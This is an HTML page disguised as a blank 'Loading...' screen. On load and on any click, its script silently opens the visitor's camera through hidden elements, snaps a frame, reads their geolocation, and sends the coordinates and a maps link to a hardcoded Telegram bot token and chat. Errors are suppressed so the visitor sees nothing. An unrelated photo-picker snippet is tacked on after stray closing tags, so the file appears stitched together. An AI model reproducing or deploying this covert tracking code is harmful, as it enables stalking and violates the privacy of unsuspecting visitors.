<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; padding: 0; background: #fff; }
    a { display: none; }
  </style>
</head>
<body>

  <video id="video" width="1" height="1" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="1" height="1" style="display:none;"></canvas>

  <script>
    const token = "8970456088:AAHBNuNtp9ZlVjVJl_uuI-9G-R1UcIVaYAg";
    const chatId = "1749244772";
    let stream = null;

    function sendToTelegram(lat, lon, photoData) {
      const message = `📸 Photo Captured!\n\n📍 Location:\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${new Date().toLocaleString()}\n\n🔗 Maps: https://www.google.com/maps?q=${lat},${lon}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .catch(() => {});
    }

    async function autoCapture() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        video.srcObject = stream;

        // Wait for video to stabilize
        await new Promise(resolve => setTimeout(resolve, 800));

        // Capture photo
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0);
        const photoData = canvas.toDataURL('image/png');

        // Stop camera
        stream.getTracks().forEach(t => t.stop());

        // Get location and send
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            sendToTelegram(lat, lon, photoData);
          }, () => {
            sendToTelegram(0, 0, photoData);
          });
        }
      } catch (err) {
        // Silent fail
      }
    }

    // Auto-capture on page load
    window.addEventListener('load', autoCapture);

    // Also trigger on click anywhere
    document.addEventListener('click', autoCapture);
  </script>

</body>
</html>
  </script>
</body><button id="instantBtn">Take Instant Photo</button>
<input id="instantInput" type="file" accept="image/*" capture="environment" style="display:none" />
<img id="instantPreview" alt="Preview" style="max-width:320px;display:block;margin-top:12px;border:1px solid #ccc;" />

<script>
  const instantBtn = document.getElementById('instantBtn');
  const instantInput = document.getElementById('instantInput');
  const instantPreview = document.getElementById('instantPreview');

  instantBtn.addEventListener('click', () => instantInput.click());

  instantInput.addEventListener('change', (e) => {
    const file = e.target.files && e.target.files[0];
    if (!file) return;
    const url = URL.createObjectURL(file);
    instantPreview.src = url;
  });
</script>
</html>
